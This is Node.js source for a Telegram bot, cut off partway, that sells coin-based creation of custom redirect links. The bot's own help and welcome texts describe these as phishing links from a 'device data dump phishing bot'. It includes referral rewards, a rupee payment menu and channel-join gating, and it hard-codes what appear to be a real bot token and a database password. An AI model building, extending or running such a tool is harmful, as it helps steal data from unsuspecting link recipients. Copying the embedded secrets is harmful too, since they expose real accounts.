const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');

const TOKEN = "8291862788:AAEvXOm7TSrCIjb1TxPm7rleiG_NooTgxdE";
const OWNER_IDS = [6703335929, 6041728084, 5136260272, 7089533955, 6125809347]; 
const CHANNEL_ID1 = "@alphacodex369";
const CHANNEL_ID2 = "@Termuxcodex";
const GROUP_ID = "@code_x369"; 
const MONGO_URI = "mongodb+srv://darkgangdarks_db_user:aEEYR59YEVameS1y@cluster0.iyakwh0.mongodb.net/DEVICEX?retryWrites=true&w=majority";

const START_IMG_URL = "https://graph.org/file/c3b658c9adaf0aba7153f-a22a3447d1410355a0.jpg";

const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ extended: true }));

mongoose.connect(MONGO_URI)
    .then(() => console.log('✅ MongoDB Connected'))
    .catch(err => console.error('❌ MongoDB Error:', err));

const userSchema = new mongoose.Schema({
    chatId: { type: Number, unique: true },
    username: String,
    firstName: String,
    coins: { type: Number, default: 0 },
    freeUrlsLeft: { type: Number, default: 4 }, 
    isBanned: { type: Boolean, default: false },
    joinedAt: { type: Date, default: Date.now },
    referredBy: { type: Number, default: null },
    referralCount: { type: Number, default: 0 },
    subscriptionExpiry: { type: Date, default: null },
    isSudo: { type: Boolean, default: false }
});

const linkSchema = new mongoose.Schema({
    shortId: { type: String, unique: true },
    creatorChatId: Number,
    originalUrl: String, 
    customName: String,
    createdAt: { type: Date, default: Date.now, expires: 86400 } 
});

const User = mongoose.model('User', userSchema);
const Link = mongoose.model('Link', linkSchema);

const userState = {};

let shareSystemEnabled = true;
let botUsername = "DX_CODEX_BOT";
bot.getMe().then(me => botUsername = me.username);

// Global Offer State
let globalOffer = {
    active: false,
    amount: 0,
    type: null, // 'coin' or 'sub'
    subString: null,
    expiresAt: 0
};


const fontMap = {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ғ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ','S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ','0':'₀','1':'₁','2':'₂','3':'₃','4':'₄','5':'₅','6':'₆','7':'₇','8':'₈','9':'₉'};

function _fnt(text) {
    if(!text) return "";
    return text.split('').map(c => fontMap[c] || c).join('');
}

function makeBorder(title, content) {
    const cleanTitle = title.replace(/<[^>]*>?/gm, ''); 
    const lines = content.split('\n').map(line => `┃ ${line}`).join('\n');
    return `<b>┏━━「 ${_fnt(cleanTitle)} 」━━┓</b>\n${lines}\n<b>┗━━━━━━━━━━┛</b>`;
}

function escapeHtml(text) {
    if (!text) return text;
    return text.toString()
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}


async function resolveUser(msg, input) {
    if (msg.reply_to_message) return await User.findOne({ chatId: msg.reply_to_message.from.id });
    if (input) {
        const cleanInput = input.trim().replace('@', '');
        if (/^\d+$/.test(cleanInput)) return await User.findOne({ chatId: parseInt(cleanInput) });
        return await User.findOne({ username: { $regex: new RegExp(`^${cleanInput}$`, 'i') } });
    }
    return null;
}

async function checkAdmin(userId) {
    if (OWNER_IDS.includes(userId)) return true;
    const u = await User.findOne({ chatId: userId });
    return u && u.isSudo;
}

function hasActiveSub(user) {
    return user.subscriptionExpiry && user.subscriptionExpiry > Date.now();
}

function getSubTimeLeft(user) {
    if (!hasActiveSub(user)) return null;
    const diff = user.subscriptionExpiry - Date.now();
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    return `${days} ᴅᴀʏs, ${hours} ʜᴏᴜʀs`;
}

async function checkMembership(chatId) {
    try {
        const s = ['creator', 'administrator', 'member', 'restricted'];
        const [c1, c2, g1] = await Promise.all([
            bot.getChatMember(CHANNEL_ID1, chatId).catch(() => null),
            bot.getChatMember(CHANNEL_ID2, chatId).catch(() => null),
            bot.getChatMember(GROUP_ID, chatId).catch(() => null)
        ]);
        
        const isC1 = c1 && s.includes(c1.status);
        const isC2 = c2 && s.includes(c2.status);
        const isG1 = g1 && s.includes(g1.status);

        return { allJoined: isC1 && isC2 && isG1 };
    } catch (e) { return { allJoined: false }; }
}

bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (msg.chat.type !== 'private') return;

    try {
        let user = await User.findOne({ chatId });
        
        if (!user) {
            user = new User({ 
                chatId, 
                username: msg.from.username || "Unknown", 
                firstName: escapeHtml(msg.from.first_name) || "User" 
            });

            if (match[1] && !isNaN(match[1]) && match[1] != chatId) {
                user.referredBy = parseInt(match[1]);
            }
            await user.save();

            if (shareSystemEnabled && user.referredBy) {
                const referrer = await User.findOne({ chatId: user.referredBy });
                if (referrer) {
                    referrer.referralCount += 1;
                    if (referrer.referralCount % 2 === 0) {
                        
                        // OFFER SYSTEM CHECK
                        if (globalOffer.active && Date.now() < globalOffer.expiresAt) {
                            if (globalOffer.type === 'coin') {
                                referrer.coins += globalOffer.amount;
                                bot.sendMessage(referrer.chatId, makeBorder("🎉 sᴘᴇᴄɪᴀʟ ᴏғғᴇʀ ʀᴇᴡᴀʀᴅ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💰: +${globalOffer.amount} ᴄᴏɪɴs ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
                            } else if (globalOffer.type === 'sub') {
                                let multiplier = 0;
                                const amtStr = globalOffer.subString;
                                const val = parseInt(amtStr);
                                if (amtStr.includes('d')) multiplier = 24 * 60 * 60 * 1000;
                                else if (amtStr.includes('w')) multiplier = 7 * 24 * 60 * 60 * 1000;
                                else if (amtStr.includes('m')) multiplier = 30 * 24 * 60 * 60 * 1000;
                                else if (amtStr.includes('y')) multiplier = 365 * 24 * 60 * 60 * 1000;
                                
                                const nowTime = Math.max(Date.now(), referrer.subscriptionExpiry ? referrer.subscriptionExpiry.getTime() : 0);
                                referrer.subscriptionExpiry = new Date(nowTime + (val * multiplier));
                                bot.sendMessage(referrer.chatId, makeBorder("🎉 sᴘᴇᴄɪᴀʟ ᴏғғᴇʀ ʀᴇᴡᴀʀᴅ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💎: +${globalOffer.subString} sᴜʙsᴄʀɪᴘᴛɪᴏɴ ᴀᴅᴅᴇᴅ!`), {parse_mode:'HTML'});
                            }
                        } else {
                            // Default Reward
                            referrer.freeUrlsLeft += 1;
                            bot.sendMessage(referrer.chatId, makeBorder("🎉 ʀᴇғᴇʀʀᴀʟ sᴜᴄᴄᴇss", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💰: +1 ғʀᴇᴇ ᴄᴏɪɴ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
                        }

                    } else {
                        bot.sendMessage(referrer.chatId, makeBorder("📈 ʀᴇғᴇʀʀᴀʟ ᴛʀᴀᴄᴋ", `✅: 1 ɴᴇᴡ ᴜsᴇʀ ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n⚠️: ɪɴᴠɪᴛᴇ 1 ᴍᴏʀᴇ ᴛᴏ ɢᴇᴛ ʀᴇᴡᴀʀᴅ.`), {parse_mode:'HTML'});
                    }
                    await referrer.save();
                }
            }
        }
        
        if (user.isBanned) {
            return bot.sendMessage(chatId, "<b>┏━━「 ʙᴀɴɴᴇᴅ 」━━┓</b>\n┃ <b>🚫: ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ!</b>\n<b>┗━━━━━━━━━━┛</b>", {parse_mode:'HTML'});
        }

        const { allJoined } = await checkMembership(chatId);
        if (allJoined) {
            if (match[1] && isNaN(match[1])) {
                const cmd = match[1].toLowerCase();
                if (cmd === 'help') return handleHelp(chatId);
                if (cmd === 'create') return handleCreateUrl(chatId, user);
                if (cmd === 'info') return handleInfo(chatId, user);
                if (cmd === 'dev') return handleDev(chatId);
                if (cmd === 'referral') return handleShare(chatId, user);
            }
            await showMainMenu(msg);
        } else {
            await showVerificationMenu(msg);
        }
    } catch (error) { console.log(error); }
});

async function showMainMenu(msg) {
    const chatId = msg.chat.id || msg.from.id;
    const cleanName = escapeHtml(msg.from.first_name || "User");
    const mention = `<a href="tg://user?id=${chatId}">${cleanName}</a>`;
    
    const content = `<b>┏━━「 ${_fnt("DASHBOARD")} 」━━┓</b>
┃ <b>┏─「 ᴜsᴇʀ ᴘʀᴏғɪʟᴇ 」</b>
┃ ┃ 👤 <b>ɴᴀᴍᴇ:</b> ${mention}
┃ ┃ 🆔 <b>ɪᴅ:</b> <code>${chatId}</code>
┃ ┗───────────╼
┃ <b>┏─「 ʙᴏᴛ ғᴇᴀᴛᴜʀᴇs 」</b>
┃ ┃ ✅ <b>ᴄᴜsᴛᴏᴍ ᴜʀʟ ɢᴇɴᴇʀᴀᴛɪᴏɴ</b>
┃ ┃ ✅ <b>ɪɴsᴛᴀɴᴛ ᴅᴀᴛᴀ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ</b>
┃ ┃ ✅ <b>24/ʜ sᴇʀᴠᴇʀ ᴜᴘᴛɪᴍᴇ</b>
┃ ┃ ✅ <b>sᴇᴄᴜʀᴇ ᴅᴀᴛᴀʙᴀsᴇ</b>
┃ ┗───────────╼
┃ <b>┏─「 ʜᴏᴡ ᴛᴏ ᴏᴘᴇʀᴀᴛᴇ 」</b>
┃ ┃ 1️⃣ <b>ᴄʟɪᴄᴋ 'ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ'</b>
┃ ┃ 2️⃣ <b>ᴇɴᴛᴇʀ ᴀ sʜᴏʀᴛ ɴᴀᴍᴇ ғᴏʀ ʟɪɴᴋ</b>
┃ ┃ 3️⃣ <b>sᴇᴛ ᴀ ᴄᴜsᴛᴏᴍ ʀᴇᴅɪʀᴇᴄᴛ ᴜʀʟ</b>
┃ ┃ 4️⃣ <b>sʜᴀʀᴇ ʟɪɴᴋ & ɢᴇᴛ ɪɴsᴛᴀɴᴛ ᴅᴀᴛᴀ</b>
┃ ┗───────────╼
┃ <b>┏─「 sʏsᴛᴇᴍ ɪɴғᴏ 」</b>
┃ ┃ 👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇʀ: Ｄｘ－Ｓｉｍｕ</b>
┃ ┗───────────╼
┃ <b>ᴜsᴀɢᴇ: /help</b>
<b>┗━━━━━━━━━━┛</b>`;

    await bot.sendPhoto(chatId, START_IMG_URL, {
        caption: content,
        parse_mode: 'HTML',
        reply_markup: { 
            keyboard: [
                [{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ" }], 
                [{ text: "👤 ᴍʏ ɪɴғᴏ" }, { text: "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" }],
                [{ text: "🤝 sʜᴀʀᴇ & ᴇᴀʀɴ" }, { text: "💰 ʙᴜʏ ᴄᴏɪɴ" }]
            ], 
            resize_keyboard: true 
        }
    });

    await bot.sendMessage(chatId, `💬 <b>ɴᴇᴇᴅ ʜᴇʟᴘ ᴏʀ sᴜᴘᴘᴏʀᴛ?</b>`, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [[{ text: "🛠 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
        }
    });
}

async function showVerificationMenu(msg) {
    const chatId = msg.chat.id || msg.from.id;
    const cleanName = escapeHtml(msg.from.first_name || "User");
    
    const dashboard = `<b>┏━━「 ${_fnt("WELCOME")} 」━━┓</b>
┃ <b>┏─「 👋 ʜᴇʟʟᴏ ᴜsᴇʀ 」</b>
┃ ┃ 👤 <b>ɴᴀᴍᴇ: <a href="tg://user?id=${chatId}">${cleanName}</a></b>
┃ ┃ 🆔 <b>ɪᴅ:</b> <code>${chatId}</code>
┃ ┗───────────╼
┃ <b>┏─「 sʏsᴛᴇᴍ ɪɴғᴏ 」</b>
┃ ┃ 👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇʀ: Ｄｘ－Ｓｉｍｕ</b>
┃ ┗───────────╼
<b>┗━━━━━━━━━━┛</b>
<blockquote><b>📢: ᴘʟᴇᴀsᴇ ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟs</b></blockquote>`;

    await bot.sendPhoto(chatId, START_IMG_URL, {
        caption: dashboard,
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "📢 ᴄʜᴀɴɴᴇʟ 𝟷", url: `https://t.me/${CHANNEL_ID1.replace('@', '')}` }],
                [{ text: "📢 ᴄʜᴀɴɴᴇʟ 𝟸", url: `https://t.me/${CHANNEL_ID2.replace('@', '')}` }],
                [{ text: "👥 ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }],
                [{ text: "✅ ᴠᴇʀɪғʏ", callback_data: "verify_join" }]
            ]
        }
    });
}


bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    const allUserCmds = ['/start', '/create', '/info', '/dev', '/referral', '/help', '/gift', '/buy'];
    if (msg.chat.type !== 'private') {
        if (text && text.startsWith('/')) {
            const cmdPrefix = text.split(' ')[0].toLowerCase();
            if (allUserCmds.includes(cmdPrefix)) {
                const safeCmd = cmdPrefix.replace('/', '');
                bot.sendMessage(chatId, `<b>⚠️ ${_fnt("PLEASE USE COMMANDS IN PRIVATE CHAT")}</b>\n<b>┃ 🤖: ᴄʟɪᴄᴋ ʙᴇʟᴏᴡ ᴛᴏ ᴜsᴇ ɪɴ ᴅᴍ</b>`, {
                    parse_mode: 'HTML',
                    reply_to_message_id: msg.message_id,
                    reply_markup: {
                        inline_keyboard: [[{ text: "🤖 ɢᴏ ᴛᴏ ʙᴏᴛ ᴅᴍ", url: `https://t.me/${botUsername}?start=${safeCmd}` }]]
                    }
                });
            }
        }
        return; 
    }

    if (text && (text.startsWith('/add ') || text.startsWith('/rem ') || text.startsWith('/rm ') || text.startsWith('/reset ') || text.startsWith('/ban ') || text.startsWith('/unban ') || text.startsWith('/users') || text.startsWith('/share ') || text.startsWith('/sudo') || text.startsWith('/gift') || text.startsWith('/ref ') || text.startsWith('/offer'))) return;
    if ((msg.caption && msg.caption.startsWith('/broadcast')) || (text && text.startsWith('/broadcast'))) return handleBroadcast(msg);

    if (!text) return;

    const user = await User.findOne({ chatId: msg.from.id });
    if (!user || user.isBanned) return;

    if (text === "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ" || text === "/create") {
        handleCreateUrl(chatId, user);
    } 
    else if (text === "👤 ᴍʏ ɪɴғᴏ" || text === "/info") {
        handleInfo(chatId, user);
    }
    else if (text === "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" || text === "/dev") {
        handleDev(chatId);
    }
    else if (text === "🤝 sʜᴀʀᴇ & ᴇᴀʀɴ" || text === "/referral") {
        handleShare(chatId, user);
    }
    else if (text === "/help") {
        handleHelp(chatId);
    }
    else if (text === "💰 ʙᴜʏ ᴄᴏɪɴ" || text === "/buy") {
        handleBuyCoin(chatId);
    }
    
    else if (userState[chatId]) {
        if (userState[chatId].step === 'await_custom_name') {
            const cleanName = text.trim().replace(/[^a-zA-Z0-9-_]/g, '');
            if(cleanName.length < 3) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ɴᴀᴍᴇ ᴛᴏᴏ sʜᴏʀᴛ"), {parse_mode:'HTML'});
            const exists = await Link.findOne({ shortId: cleanName });
            if(exists) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ɴᴀᴍᴇ ᴛᴀᴋᴇɴ!"), {parse_mode:'HTML'});
            
            userState[chatId].name = cleanName;
            askRedirect(msg, cleanName);
        } else if (userState[chatId].step === 'await_redirect_url') {
            if(!text.startsWith('http')) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "</b>❌: ᴜʀʟ ᴍᴜsᴛ sᴛᴀʀᴛ ᴡɪᴛʜ http"), {parse_mode:'HTML'});
            createFinalLink(msg, userState[chatId].name, text.trim());
        }
    }
});

async function handleCreateUrl(chatId, user) {
    const isSub = hasActiveSub(user);
    if (!isSub && user.freeUrlsLeft <= 0 && user.coins <= 0) {
        return bot.sendMessage(chatId, makeBorder("⚠️ ɴᴏ ᴄᴏɪɴs", `<b>🚫: ғʀᴇᴇ ᴛʀɪᴀʟ ᴇɴᴅᴇᴅ\n💰: ʙᴜʏ ᴄᴏɪɴs ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ</b>`), {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "💰 ʙᴜʏ ᴄᴏɪɴs", url: `https://t.me/dx_codex?text=**ɪ%20ᴡᴀɴᴛ%20ᴛᴏ%20ʙᴜʏ%20ᴄᴏɪɴ**%0A` }]] }
        });
    }
    
    let balText = isSub ? `<b>💎 sᴜʙsᴄʀɪᴘᴛɪᴏɴ:</b> <code>${getSubTimeLeft(user)}</code>` : `<b>🎁 ғʀᴇᴇ:</b> <code>${user.freeUrlsLeft}</code>\n<b>┃ 💰 ᴄᴏɪɴs:</b> <code>${user.coins}</code>`;
    
    const info = `<b>👤:</b> <code>${user.firstName}</code>
┃ ${balText}
┃ <b>┏─「 ɪɴsᴛʀᴜᴄᴛɪᴏɴs 」</b>
┃ ┃ 3️⃣ <b>ʀᴀɴᴅᴏᴍ: sʏsᴛᴇᴍ ᴡɪʟʟ ᴍᴀᴋᴇ ᴀ ɴᴀᴍᴇ</b>
┃ ┃ 4️⃣ <b>ᴀғᴛᴇʀ ᴛʜᴀᴛ: ʏᴏᴜ ᴄᴀɴ sᴇᴛ ʀᴇᴅɪʀᴇᴄᴛ</b>
┃ ┗───────────╼
┃ <b>ᴄᴜsᴛᴏᴍ ɴᴀᴍᴇ ᴍᴜsᴛ ʙᴇ 𝟹+ ʟᴇᴛᴛᴇʀs</b>`;

    bot.sendMessage(chatId, makeBorder("ᴄʀᴇᴀᴛᴇ ᴜʀʟ", info), {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [[{ text: "✏️ ᴄᴜsᴛᴏᴍ ɴᴀᴍᴇ", callback_data: "create_custom" }, { text: "🎲 ʀᴀɴᴅᴏᴍ ɴᴀᴍᴇ", callback_data: "create_random" }]] }
    });
}

function handleBuyCoin(chatId) {
    const buyText = `<b>┏━━「 ᴅᴀsʜʙᴏᴀʀᴅ 」━━┓
┃ ┏─「 ʙᴜʏ ᴄᴏɪɴ 」
┃ ┃  1. ₹30 = 60 ᴄᴏɪɴ
┃ ┃  2. ₹50 = 105 ᴄᴏɪɴ
┃ ┃  3. ₹100 = 210 ᴄᴏɪɴ
┃ ┃  4. ₹200 = 330 ᴄᴏɪɴ
┃ ┃  5. ₹300 = 2 ᴍᴏɴᴛʜ ғʀᴇᴇ
┃ ┃  6. ₹500 = 5 ᴍᴏɴᴛʜ ғʀᴇᴇ
┃ ┃  7. ₹1000 = 1 ʏᴇᴀʀ ғʀᴇᴇ
┃ ┗───────────╼
┗━━━━━━━━━━━━━┛</b>`;

    const baseUrl = `https://t.me/dx_codex?text=**ɪ%20ᴡᴀɴᴛ%20ᴛᴏ%20ʙᴜʏ%20ᴄᴏɪɴ**%0A`;

    bot.sendMessage(chatId, buyText, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "₹30 = 60 ᴄᴏɪɴ", url: baseUrl + encodeURIComponent("Package ₹30 = 60 ᴄᴏɪɴ") }],
                [{ text: "₹50 = 105 ᴄᴏɪɴ", url: baseUrl + encodeURIComponent("Package ₹50 = 105 ᴄᴏɪɴ") }],
                [{ text: "₹100 = 210 ᴄᴏɪɴ", url: baseUrl + encodeURIComponent("Package ₹100 = 210 ᴄᴏɪɴ") }],
                [{ text: "₹200 = 330 ᴄᴏɪɴ", url: baseUrl + encodeURIComponent("Package ₹200 = 330 ᴄᴏɪɴ") }],
                [{ text: "₹300 = 2 ᴍᴏɴᴛʜ ғʀᴇᴇ", url: baseUrl + encodeURIComponent("Package ₹300 = 2 ᴍᴏɴᴛʜ ғʀᴇᴇ") }],
                [{ text: "₹500 = 5 ᴍᴏɴᴛʜ ғʀᴇᴇ", url: baseUrl + encodeURIComponent("Package ₹500 = 5 ᴍᴏɴᴛʜ ғʀᴇᴇ") }],
                [{ text: "₹1000 = 1 ʏᴇᴀʀ ғʀᴇᴇ", url: baseUrl + encodeURIComponent("Package ₹1000 = 1 ʏᴇᴀʀ ғʀᴇᴇ") }],
                [{ text: "💳 ᴏᴛʜᴇʀ", url: baseUrl + encodeURIComponent("Other Package") }]
            ]
        }
    });
}

async function handleInfo(chatId, user) {
    const activeLinkCount = await Link.countDocuments({ creatorChatId: chatId });
    const joinDate = user.joinedAt ? new Date(user.joinedAt).toLocaleDateString() : "N/A";
    
    let subData = "";
    if (hasActiveSub(user)) {
        subData = `<b>┃ ┃ 💎 sᴜʙsᴄʀɪᴘᴛɪᴏɴ: ${getSubTimeLeft(user)}</b>\n`;
    } else {
        subData = `<b>┃ ┃ 💰 ᴄᴏɪɴs: ${user.coins}</b>\n<b>┃ ┃ 🎁 ғʀᴇᴇ: ${user.freeUrlsLeft}</b>\n`;
    }

    const infoMsg = 
`<b>┏━━「 ${_fnt("YOUR INFO")} 」━━┓</b>
<b>┃ ┏─「 ${_fnt("USER PROFILE")} 」</b>
<b>┃ ┃ 👤 ɴᴀᴍᴇ: ${user.firstName}</b>
<b>┃ ┃ 🆔 ɪᴅ: <code>${user.chatId}</code></b>
<b>┃ ┗───────────╼</b>
<b>┃</b> 
<b>┃ ┏─「 ${_fnt("PROFILE DETAILS")} 」</b>
${subData}<b>┃ ┃ 🛡 ʙᴀɴ: ${user.isBanned ? "Yes" : "No"}</b>
<b>┃ ┃ 📅 ᴅᴀᴛᴇ: ${joinDate}</b>
<b>┃ ┃ 🔗 ʟɪɴks: ${activeLinkCount}</b>
<b>┃ ┗───────────╼</b>
<b>┗━━━━━━━━━━┛</b>`;

    bot.sendMessage(chatId, infoMsg, { 
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: `📢 ${_fnt("ʙᴜʏ ᴄᴏɪɴ")}`, url: `https://t.me/dx_codex?text=**ɪ%20ᴡᴀɴᴛ%20ᴛᴏ%20ʙᴜʏ%20ᴄᴏɪɴ**%0A` }]
            ]
        }
    });
}

function handleDev(chatId) {
    bot.sendMessage(chatId, makeBorder("ᴅᴇᴠᴇʟᴏᴘᴇʀ", "👨‍💻: ᴄᴏᴅᴇᴅ ʙʏ ᴅx-ᴄᴏᴅᴇx\n🛡: ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄᴏᴅᴇx—ᴛᴇᴀᴍ"), { 
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [[{ text: "🛠 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
        }
    });
}

function handleShare(chatId, user) {
    const shareText = `<b>┏━━「 ${_fnt("REFERRAL SYSTEM")} 」━━┓</b>\n` +
                      `┃ 🚀 <b>ɪɴᴠɪᴛᴇ ғʀɪᴇɴᴅs & ᴇᴀʀɴ!</b>\n` +
                      `┃ 👥 <b>ғᴏʀ ᴇᴠᴇʀʏ 2 ɴᴇᴡ ᴜsᴇʀs:</b>\n` +
                      `┃ 💰 <b>ʏᴏᴜ ɢᴇᴛ 1 ғʀᴇᴇ ᴄᴏɪɴ!</b>\n` +
                      `┃\n` +
                      `┃ 📊 <b>ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟs:</b> <code>${user.referralCount || 0}</code>\n` +
                      `<b>┗━━━━━━━━━━━━━━━┛</b>\n\n` +
                      `👇 <b>ᴄʟɪᴄᴋ ʙᴇʟᴏᴡ ᴛᴏ sʜᴀʀᴇ ʏᴏᴜʀ ʟɪɴᴋ!</b>`;
    
    const inviteUrl = `https://t.me/share/url?url=https://t.me/${botUsername}?start=${chatId}&text=🔥%20Join%20this%20awesome%20bot%20and%20create%20custom%20links!`;
    bot.sendMessage(chatId, shareText, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [[{ text: "📲 sʜᴀʀᴇ ɴᴏᴡ", url: inviteUrl }]] }
    });
}

function handleHelp(chatId) {
    const helpText = `<b>┏━━「 ${_fnt("HELP MENU")} 」━━┓</b>
┃ <b>┏─「 ᴜsᴇʀ ᴄᴏᴍᴍᴀɴᴅs 」
┃ ┃ 🔹 /create - <code>ᴍᴀᴋᴇ ᴄᴜsᴛᴏᴍ ᴜʀʟ</code>
┃ ┃ 🔹 /info - <code>ᴠɪᴇᴡ ᴘʀᴏғɪʟᴇ</code>
┃ ┃ 🔹 /referral - <code>sʜᴀʀᴇ & ᴇᴀʀɴ</code>
┃ ┃ 🔹 /dev - <code>ᴅᴇᴠᴇʟᴏᴘᴇʀ ɪɴғᴏ</code>
┃ ┃ 🔹 /gift 10 [id] - <code>ɢɪғᴛ ᴄᴏɪɴs ᴛᴏ ᴜsᴇʀ</code>
┃ ┗───────────╼</b>
┃ <b>┏─「 ʙᴜᴛᴛᴏɴs ᴜsᴀɢᴇ 」
┃ ┃ 🔘 ᴄʀᴇᴀᴛᴇ ᴜʀʟ: ᴍᴀᴋᴇ ɴᴇᴡ ᴘʜɪsʜɪɴɢ ʟɪɴᴋs
┃ ┃ 🔘 ᴍʏ ɪɴғᴏ: ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴛɪᴠᴇ sᴛᴀᴛs/ᴄᴏɪɴs
┃ ┃ 🔘 sʜᴀʀᴇ & ᴇᴀʀɴ: ɢᴇᴛ ʟɪɴᴋ ᴛᴏ ʀᴇғᴇʀ
┃ ┗───────────╼
┗━━━━━━━━━━┛</b>`;
    bot.sendMessage(chatId, helpText, { parse_mode: 'HTML' });
}


bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const msg = query.message;

    if (data === 'cmd_info') {
        const user = await User.findOne({ chatId });
        handleInfo(chatId, user);
        return bot.answerCallbackQuery(query.id);
    } 
    else if (data === 'cmd_dev') {
        handleDev(chatId);
        return bot.answerCallbackQuery(query.id);
    } 
    else if (data === 'cmd_referral') {
        const user = await User.findOne({ chatId });
        handleShare(chatId, user);
        return bot.answerCallbackQuery(query.id);
    }

    if (data === 'verify_join') {
        try {
            const { allJoined } = await checkMembership(chatId);
            if (allJoined) {
                await bot.answerCallbackQuery(query.id, { text: "✅ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ sᴜᴄssᴇss!" });

                try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) { }

                const user = await User.findOne({ chatId });
                const name = escapeHtml(user.firstName || "User");
                const mention = `<a href="tg://user?id=${chatId}">${name}</a>`;

                const title = _fnt("SYSTEM READY");
                const body = 
`👤 <b>ᴜsᴇʀ: ${mention}</b>
🆔 <b>ɪᴅ:</b> <code>${chatId}</code>
━━━━━━━━━━━━━┛
🤖 <b>ᴛʜɪs ɪs ᴀ ᴅᴇᴠɪᴄᴇ ᴅᴀᴛᴀ ᴅᴜᴍᴘ</b>
        <b>ᴘʜɪsʜɪɴɢ ʙᴏᴛ</b>
🔗 <b>ɪғ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ ᴜʀʟ</b>
      <b>ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ</b>`;

                await bot.sendMessage(chatId, makeBorder(title, body), {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ", callback_data: "create_custom" }],
                            [{ text: "🛠 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]
                        ]
                    }
                });

                await bot.sendMessage(chatId, `⌨️ <b>ᴍᴇɴᴜ ᴋᴇʏʙᴏᴀʀᴅ ᴀᴄᴛɪᴠᴀᴛᴇᴅ.</b>`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
